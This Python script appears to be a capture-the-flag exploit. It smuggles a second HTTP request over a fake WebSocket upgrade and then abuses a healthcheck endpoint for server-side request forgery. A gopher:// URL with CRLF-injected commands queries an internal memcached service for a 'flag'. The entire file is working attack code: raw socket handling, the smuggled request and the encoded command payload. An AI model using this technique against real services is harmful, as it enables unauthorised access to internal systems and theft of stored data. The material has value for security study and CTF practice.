import socket
from urllib.parse import quote

req1 = '''GET /ws HTTP/1.1
Host: localhost
Upgrade: websocket

'''.replace('\n', '\r\n')

command = quote("%0d%0aget%20flag%0d%0aquit%0d%0a")

req2 = f'''GET /healthcheck?check_url=gopher://memcached:11211/_{command} HTTP/1.1
Host: localhost

'''.replace('\n', '\r\n')

def main(netloc):
    try:
        host, port = netloc.split(':')

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, int(port)))

        sock.sendall(req1.encode())
        sock.recv(4096)

        sock.sendall(req2.encode())
        data = sock.recv(4096)
        data = data.decode(errors='ignore')

        print(data)

        sock.shutdown(socket.SHUT_RDWR)
        sock.close()
    except Exception as e:
        print(e)


if __name__ == "__main__":
    main('127.0.0.1:80')